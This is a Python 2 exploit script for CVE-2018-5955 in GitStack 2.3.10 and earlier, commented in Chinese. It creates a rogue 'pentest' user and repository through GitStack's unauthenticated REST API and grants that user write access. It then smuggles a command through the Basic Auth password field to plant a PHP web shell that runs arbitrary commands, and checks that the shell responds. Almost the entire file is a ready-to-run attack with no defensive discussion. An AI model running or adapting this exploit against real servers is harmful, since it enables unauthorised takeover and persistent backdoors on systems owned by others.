#!/usr/bin/env python
# -*- coding:utf-8 -*-

'''
CVE-2018-5955 GitStack<= 2.3.10 远程命令执行漏洞 EXP 改进版
（特此鸣谢）参考作者:CaijiOrz(GitHub账号)
作者:b0b@c
使用:仅限于学习、交流、公司内部使用
'''

import requests
from optparse import OptionParser
from requests.auth import HTTPBasicAuth

class Exploitor(object):
    '''Rce漏洞利用器'''
    def __init__(self, target, abusepath='c:\\GitStack\\gitphp', payload=None):
        '''Rce漏洞利用器创建'''
        self.target = target
        self.abusepath = abusepath
        if payload == None:
            self.payload = "p && echo ^<?php echo @system($_POST['cmd']) ?^> > %s\\gitstack.php"%self.abusepath
        else:
            self.payload = "p && echo ^<?php %s ?^> > %s\\gitstack.php"%(self.payload, self.abusepath)

    def __userCheck(self):
        '''用户检查'''
        url = '%s/rest/user/'%self.target
        try:
            usersJson = requests.get(url, verify=False).json()
        except Exception, reason:
            print '[-] 连接GitStackAPI失败'
            exit(0)
        try:
            usersJson.remove('admin')
            usersJson.remove('eyeryone')
        except Exception, reason:
            pass
        if len(usersJson) > 0 and 'pentest' in usersJson:
            self.user = 'pentest'
            print '[+] 发现可用账户：',self.user
        else:
            try:
                response = requests.post(url, data={'username':'pentest', 'password':'pentest'}, verify=False)
            except Exception, reason:
                print '[-] 创建用户失败'
                exit(0)
            if 'User created' not in response.text:
                print '[-] 创建用户失败'
                exit(0)
            else:
                print '[+] 创建用户成功'
                self.user = 'pentest'

    def __repositoryCheck(self):
        '''项目检查'''
        url = '%s/rest/repository/'%self.target
        try:
            repositoryJson = requests.get(url, verify=False).json()
        except Exception, reason:
            print '[-] 连接GitStackAPI失败'
            exit(0)
        if repositoryJson:
            repository = repositoryJson[0]['name']
            print '[+] 发现可用项目：',repository
            self.repository = repository
        else:
            try:
                response = requests.post(url, cookies={'csrftoken':'pentest'}, data={'name':'pentestgit', 'csrfmiddlewaretoken':'pentest'})
            except Exception, reason:
                print '[-] 创建项目失败'
                exit(0)
            if 'successfully create repository' not in response.text:
                print '[-] 创建项目失败'
                exit(0)
            else:
                print '[+] 创建项目成功'
                self.repository = 'pentestgit'

    def __permissionCheck(self):
        '''权限检查'''
        url = url = '%s/rest/repository/%s'%(self.target,self.repository)
        try:
            response = requests.get(url, verify=False)
        except Exception, reason:
            print '[-] 权限检查失败'
            exit(0)
        users = response.json()['user_write_list']
        flag = False
        if len(users) > 0:
            if self.user in [x['username'] for x in users]:
                print '[+] 权限检查成功'
                flag = True
        if not flag:
            url = '%s/rest/repository/%s/user/%s/'%(self.target, self.repository, self.user)
            try:
                response = requests.post(url, verify=False)
            except Exception, reason:
                print '[-] 加载权限失败'
                exit(0)
            try:
                response = requests.get(url, verify=False)
            except Exception, reason:
                print '[-] 验证权限失败'
                exit(0)
            if 'true' in response.text:
                print '[+] 权限加载成功'
            else:
                print '[-] 权限验证失败'
                exit(0)

    def __attack(self):
        '''攻击尝试'''
        url = '%s/web/index.php?p=%s.git&a=summary'%(self.target, self.repository)
        try:
            response = requests.get(url, auth=HTTPBasicAuth(self.user, self.payload), verify=False)
        except Exception, reason:
            print '[-] 攻击失败'
            exit(0)
        url = '%s/web/gitstack.php'%self.target
        try:
            response = requests.get(url, verify=False)
        except Exception, reason:
            print '[-] 验证攻击失败'
            exit(0)
        if response.status_code == 200:
            print '[+] 攻击成功'
        else:
            print '[-] 尝试访问无效，攻击失败'
            exit(0)

    def attack(self):
        '''攻击过程'''
        self.__userCheck()
        self.__repositoryCheck()
        self.__permissionCheck()
        self.__attack()


if __name__ == '__main__':
    parser = OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Set Target")
    parser.add_option("-p", "--payload", dest="payload", help="Set Payload")
    parser.add_option("-f", "--filepath", dest="filepath", help="Set FilePath")
    (options, args) = parser.parse_args()
    if options.target in [None,'']:
        print '[-] 请输入目标URL'
        exit(0)
    else:
        if options.payload == None and options.filepath  == None:
            attacker = Exploitor(options.target)
        elif options.payload != None and options.filepath == None:
            attacker = Exploitor(options.target, payload=options.payload)
        elif options.payload == None and options.filepath != None:
            attacker = Exploitor(options.target, abusepath=options.filepath)
        elif options.payload != None and options.filepath != None:
            attacker = Exploitor(options.target, abusepath=options.filepath, payload=options.payload)
        attacker.attack()
